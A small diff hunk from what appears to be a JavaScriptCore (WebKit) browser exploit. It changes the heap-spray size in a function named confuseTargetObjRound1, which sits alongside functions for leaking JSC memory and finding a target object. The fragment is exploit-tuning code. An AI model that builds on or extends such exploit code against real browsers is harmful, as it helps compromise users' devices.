@@ -294,7 +294,7 @@ function leakJSC() {
  */
 function confuseTargetObjRound1() {
 	/* Force allocation of StringImpl obj. beyond Timer address */
-	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 2);
+	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 4);
 
 	/* Checking for leaked data */
 	if (findTargetObj() === false)
